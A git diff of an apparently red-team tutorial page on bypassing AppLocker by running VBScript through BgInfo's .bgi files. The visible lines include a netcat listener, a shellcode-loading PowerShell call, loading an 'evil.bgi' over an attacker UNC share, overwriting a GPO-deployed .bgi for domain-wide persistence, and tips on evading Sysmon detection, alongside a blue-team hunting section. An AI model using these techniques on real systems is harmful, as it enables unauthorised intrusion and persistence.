@@ -1,11 +1,30 @@
 ---
 title: "AppLocker Bypass: BgInfo VBScript Execution"
-date: 2026-03-06
-description: "Abusing BgInfo's OLE .bgi configuration files to execute VBScript payloads under a Microsoft-signed binary, including GPO share persistence and Python tooling to generate weaponised .bgi files."
+date: 2026-05-30
+weight: 6
+reading_path: "applocker"
+step: 6
+description: "Abusing BgInfo's OLE .bgi configuration files to execute VBScript under a Microsoft-signed binary, including GPO share persistence and detection."
+verified: "Windows 10/11 Enterprise · May 2026"
 tags: ["applocker", "bypass", "bginfo", "vbscript", "ole", "persistence", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution), [T1547.001](https://attack.mitre.org/techniques/T1547/001/) (Registry Run Keys / Startup Folder — persistence variant), and [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer).
+
+---
+
+## Why Does BgInfo Bypass AppLocker?
+
+BgInfo reads configuration from `.bgi` files, OLE2 compound documents (the same container format as old Word and Excel files). Inside, it evaluates **custom field** definitions written in VBScript to collect system information and display it on the desktop wallpaper.
+
+That VBScript execution is the bypass. You can write any valid VBScript into a custom field. BgInfo will evaluate it during its information-gathering pass, entirely inside its own process, before AppLocker ever gets involved. Use `WScript.Shell.Run()` to spawn a subprocess, `ADODB.Stream` to download files, or chain into a PowerShell one-liner for a full reverse shell.
+
+The trust chain has three layers working in your favor:
+1. **Path trust** — `bginfo.exe` lives in `C:\Windows\`, covered by `%WINDIR%\*`. The same path-trust assumption is what [trusted folder abuse](/docs/applocker/bypass-trusted-folders/) attacks directly.
+2. **Publisher trust** — BgInfo is signed by Microsoft Corporation; publisher rules let it through automatically.
+3. **Data file gap** — The `.bgi` file is a configuration file, not an executable. AppLocker doesn't evaluate configuration files.
+
+In environments where BgInfo is already deployed at logon via GPO, this becomes persistence. Replace the shared `.bgi` file and every user logon delivers a shell.
 
 ---
 
@@ -34,7 +53,7 @@ BgInfo is a Sysinternals utility that many enterprise environments deploy to sta
 └─────────────────────────────────────────────────────────┘
 ```
 
-### Windows VM — BgInfo + AppLocker Configuration
+### Windows VM: BgInfo + AppLocker Configuration
 
 ```powershell {linenos=inline}
 # 1. Download BgInfo from Microsoft Sysinternals
@@ -87,7 +106,7 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
     Select-Object TimeCreated, Id, Message | Format-List
 ```
 
-### Attacker VM (Kali) — Listener, Server, and .bgi Tools
+### Attacker VM (Kali): Listener, Server, and .bgi Tools
 
 ```bash {linenos=inline}
 # Listener for reverse shell
@@ -132,74 +151,36 @@ Roll back between technique tests to preserve the baseline.
 
 ## Diagrams
 
-### Execution Chain — Standard Flow
+### Execution Chain: Standard Flow
 
-``` {linenos=inline}
-Attacker crafts malicious .bgi on Kali
-(VBScript payload embedded in OLE compound document)
-        │
-        ▼
-.bgi delivered to target
-  Option A: HTTP download → %TEMP%\update.bgi
-  Option B: UNC path      → \\attacker\share\payload.bgi
-  Option C: Pre-existing  → replace legitimate bginfo.bgi in startup
-        │
-        ▼
-Standard user executes:
-  bginfo.exe malicious.bgi /timer:0 /silent /nolicprompt
-        │
-        ▼
-BgInfo.exe (Microsoft-signed, trusted path) loads the .bgi
-  → Parses OLE compound document
-  → Reads custom field definitions
-  → Evaluates each field's VBScript via embedded scripting engine
-        │
-        ▼
-VBScript payload executes INSIDE bginfo.exe process
-  → WScript.Shell.Run() spawns payload subprocess
-  → Or: ADODB.Stream downloads + saves next-stage binary
-  → Or: PowerShell subprocess connects reverse shell
-        │
-        ▼
-AppLocker evaluation:
-  bginfo.exe → lives in %WINDIR%\* → ALLOWED (path rule)
-  bginfo.exe → Microsoft-signed → ALLOWED (publisher rule)
-  .bgi file  → not an executable → not evaluated
-  VBScript   → runs in-process  → not evaluated
-  powershell.exe (child) → System32 → ALLOWED
+```mermaid
+flowchart TD
+    C["Attacker crafts malicious .bgi on Kali\nVBScript payload in an OLE compound document"] --> D["Deliver to target\nHTTP download, UNC path, or replace a startup .bgi"]
+    D --> E["Standard user runs\nbginfo.exe malicious.bgi /timer:0 /silent /nolicprompt"]
+    E --> F["BgInfo.exe (signed, trusted path) parses the OLE doc\nand evaluates each field's VBScript in-process"]
+    F --> G["Payload runs inside bginfo.exe\nWScript.Shell.Run, ADODB.Stream download, or PowerShell reverse shell"]
+    G --> H{"AppLocker evaluation"}
+    H -->|"bginfo.exe: %WINDIR% + Microsoft cert"| ALLOW["ALLOWED"]
+    H -->|".bgi: not an executable"| SKIP1["Not evaluated"]
+    H -->|"VBScript: runs in-process"| SKIP2["Not evaluated"]
+    H -->|"child powershell.exe: System32"| ALLOW
 ```
 
 ### AppLocker Coverage Gap
 
-``` {linenos=inline}
-┌──────────────────────────────┬──────────────┬───────────────────────────────┐
-│  Component                   │  AppLocker   │  Notes                        │
-│                              │  Checks It?  │                               │
-├──────────────────────────────┼──────────────┼───────────────────────────────┤
-│  bginfo.exe                  │  YES — ALLOW │  %WINDIR%\* path match        │
-│  (C:\Windows\bginfo.exe)     │              │  + Microsoft publisher cert   │
-├──────────────────────────────┼──────────────┼───────────────────────────────┤
-│  malicious.bgi               │  NO          │  Not an executable;           │
-│  (OLE config file)           │              │  AppLocker ignores data files │
-├──────────────────────────────┼──────────────┼───────────────────────────────┤
-│  VBScript in custom field    │  NO          │  Runs inside bginfo.exe;      │
-│                              │              │  no process creation to check │
-├──────────────────────────────┼──────────────┼───────────────────────────────┤
-│  powershell.exe (spawned)    │  YES — ALLOW │  C:\Windows\System32\         │
-│                              │              │  matches default path rule    │
-├──────────────────────────────┼──────────────┼───────────────────────────────┤
-│  Inline PS script content    │  NO          │  Unless Script Rules enabled  │
-│  (passed via -EncodedCommand)│              │  (they're off by default)     │
-└──────────────────────────────┴──────────────┴───────────────────────────────┘
+A trusted binary loads a data file that contains executable logic. AppLocker evaluates the loader, not the content it processes:
 
-Bypass summary: trusted binary (bginfo.exe) loads a data file (.bgi) that
-                contains executable logic. AppLocker evaluates the loader,
-                not the content it processes.
-```
+| Component | AppLocker checks it? | Notes |
+|---|---|---|
+| `bginfo.exe` (in `C:/Windows`) | Yes — ALLOW | `%WINDIR%` path match + Microsoft publisher cert |
+| `malicious.bgi` (OLE config file) | No | Not an executable; AppLocker ignores data files |
+| VBScript in a custom field | No | Runs inside `bginfo.exe`; no process creation to check |
+| `powershell.exe` (spawned child) | Yes — ALLOW | `C:/Windows/System32` matches default path rule |
+| Inline PS script content (`-EncodedCommand`) | No | Unless Script Rules are enabled (off by default) |
 
-### BgInfo .bgi File — OLE Structure
+### BgInfo .bgi File: OLE Structure
 
-``` {linenos=inline}
+```text
 malicious.bgi  (OLE2 Compound File Binary Format)
 │
 ├── Root Entry  (directory)
@@ -222,48 +203,22 @@ OLE format == same container as old .doc / .xls files
 Tools: olefile (Python), SSView (Windows), strings (quick peek)
 ```
 
-### Persistence Flow — GPO / Startup Hijack
+### Persistence Flow: GPO / Startup Hijack
 
-``` {linenos=inline}
-Enterprise BgInfo Deployment (typical):
-  GPO Logon Script: bginfo.exe \\fileserver\it\bginfo\company.bgi /timer:0 /silent /nolicprompt
-                                        │
-                                        └── company.bgi → legitimate wallpaper config
+Hijacking an existing enterprise deployment gives domain-wide persistence with no binaries planted and no registry changes:
 
-Attacker gains write access to \\fileserver\it\bginfo\  (common misconfiguration)
-        │
-        ▼
-Replace company.bgi with weaponized version (same filename)
-        │
-        ▼
-Every user logon in the domain:
-  GPO fires → bginfo.exe \\fileserver\it\bginfo\company.bgi
-            → VBScript in evil .bgi executes
-            → Reverse shell / beacon connects back
-            → User sees normal wallpaper (add legit fields too)
-
-Domain-wide persistence with no binaries planted and no registry changes.
-Cleanup: restore original company.bgi
+```mermaid
+flowchart TD
+    G["GPO logon script (typical):\nbginfo.exe on a UNC share, company.bgi = legit wallpaper config"] --> W["Attacker gains write access to the BgInfo share\n(common misconfiguration)"]
+    W --> R["Replace company.bgi with a weaponized version\n(same filename, keeps real fields too)"]
+    R --> L["Every domain logon: GPO fires bginfo.exe against the evil .bgi"]
+    L --> S["VBScript executes, reverse shell / beacon connects back\nuser still sees a normal wallpaper"]
+    S --> CLEAN["Cleanup: restore the original company.bgi"]
 ```
 
 ---
 
-## The Core Idea
-
-BgInfo reads configuration from `.bgi` files, OLE2 compound documents (the same container format as old Word and Excel files). Inside, it evaluates **custom field** definitions written in VBScript to collect system information and display it on the desktop wallpaper.
-
-That VBScript execution is the bypass. You can write any valid VBScript into a custom field. BgInfo will evaluate it during its information-gathering pass, entirely inside its own process, before AppLocker ever gets involved. Use `WScript.Shell.Run()` to spawn a subprocess, `ADODB.Stream` to download files, or chain into a PowerShell one-liner for a full reverse shell.
-
-The trust chain has three layers working in your favor:
-1. **Path trust** — `bginfo.exe` lives in `C:\Windows\`, covered by `%WINDIR%\*`.
-2. **Publisher trust** — BgInfo is signed by Microsoft Corporation; publisher rules let it through automatically.
-3. **Data file gap** — The `.bgi` file is a configuration file, not an executable. AppLocker doesn't evaluate configuration files.
-
-In environments where BgInfo is already deployed at logon via GPO, this becomes persistence. Replace the shared `.bgi` file and every user logon delivers a shell.
-
----
-
-## VBScript Payload 1 — Calc PoC
+## VBScript Payload 1: Calc PoC
 
 The baseline confirmation. Drop this into the custom field to verify the VBScript is executing before moving to a real payload.
 
@@ -276,7 +231,7 @@ shell.Run "calc.exe", 0, False
 
 ---
 
-## VBScript Payload 2 — PowerShell Reverse Shell
+## VBScript Payload 2: PowerShell Reverse Shell
 
 VBScript constructs and fires a PowerShell reverse shell one-liner. The PS command is passed as a Base64-encoded `-EncodedCommand` to dodge naive string detection.
 
@@ -329,7 +284,7 @@ rlwrap nc -lvnp 4444
 
 ---
 
-## VBScript Payload 3 — Download and Execute
+## VBScript Payload 3: Download and Execute
 
 Pulls a next-stage binary from the attacker's HTTP server, saves it to `%TEMP%`, and executes it. No PowerShell involved, just pure COM objects available in any VBScript context.
 
@@ -368,9 +323,9 @@ python3 -m http.server 8080
 
 ---
 
-## VBScript Payload 4 — Shellcode via PowerShell Inline Loader
+## VBScript Payload 4: Shellcode via PowerShell Inline Loader
 
-For when you want your shellcode running inside a more controlled process. BgInfo's VBScript spawns a PowerShell that allocates memory, copies shellcode, and executes. PowerShell is trusted; AppLocker evaluates `powershell.exe` (allowed) and ignores the inline byte array.
+For when you want your [shellcode](/docs/applocker/process-injection/) running inside a more controlled process. BgInfo's VBScript spawns a PowerShell that allocates memory, copies shellcode, and executes. PowerShell is trusted; AppLocker evaluates `powershell.exe` (allowed) and ignores the inline byte array.
 
 **`payload_shellcode.vbs`**
 
@@ -417,7 +372,7 @@ CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & b64, 0, Fa
 
 `.bgi` files are OLE2 compound documents. The cleanest approach is to create a template file using BgInfo's own UI, then patch in the real VBScript payload programmatically.
 
-### Step 1 — Create a Template with BgInfo UI
+### Step 1: Create a Template with BgInfo UI
 
 ```
 1. Run bginfo.exe on any Windows machine (admin not required)
@@ -431,7 +386,7 @@ CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & b64, 0, Fa
 8. Transfer template.bgi to your Kali machine
 ```
 
-### Step 2 — Inspect the Template (Optional but Recommended)
+### Step 2: Inspect the Template (Optional but Recommended)
 
 **`bginfo_inspect.py`**
 
@@ -497,7 +452,7 @@ if __name__ == "__main__":
     inspect_bgi(sys.argv[1])
 ```
 
-### Step 3 — Patch the Payload In
+### Step 3: Patch the Payload In
 
 **`bginfo_gen.py`**
 
@@ -668,7 +623,7 @@ C:\Windows\bginfo.exe \\192.168.56.101\share\evil.bgi /timer:0 /silent /nolicpro
 
 ---
 
-## Persistence — Hijacking an Existing BgInfo Deployment
+## Persistence: Hijacking an Existing BgInfo Deployment
 
 This is the high-value variant. Most enterprise BgInfo deployments follow the same pattern: a GPO logon script runs BgInfo against a shared `.bgi` file on a network share. If that share has weak ACLs, you own every logon in scope.
 
@@ -754,13 +709,13 @@ smbclient //fileserver/it -U "DOMAIN\user%pass" -c "put company.bgi bginfo\compa
 
 **bginfo.exe location matters.** If BgInfo isn't pre-deployed in a trusted path, you need to drop it in one. `C:\Windows\` is the cleanest choice, as it's covered by the default path rule and doesn't look unusual. Alternatively, if the environment uses Microsoft publisher rules, bginfo.exe passes from anywhere because it's Microsoft-signed.
 
-**Child process visibility.** `WScript.Shell.Run` with window style `0` creates a hidden child process, but Sysmon Event ID 1 will still record it with bginfo.exe as parent. The parent-child chain `bginfo.exe → powershell.exe` is anomalous and worth suppressing if possible. Use the encoded command approach to avoid obvious PowerShell strings in the command line.
+**Child process visibility.** `WScript.Shell.Run` with window style `0` creates a hidden child process, but [Sysmon](/docs/blueteam/lolbins-hunting/) Event ID 1 will still record it with bginfo.exe as parent. The parent-child chain `bginfo.exe → powershell.exe` is anomalous and worth suppressing if possible. Use the encoded command approach to avoid obvious PowerShell strings in the command line.
 
 ---
 
 ## Detection and Blue Team
 
-### What to Hunt
+### What Should You Hunt For?
 
 BgInfo running with a path to a `.bgi` file is the baseline event. The threat indicators are:
 - BgInfo running from unexpected locations (not startup/logon)
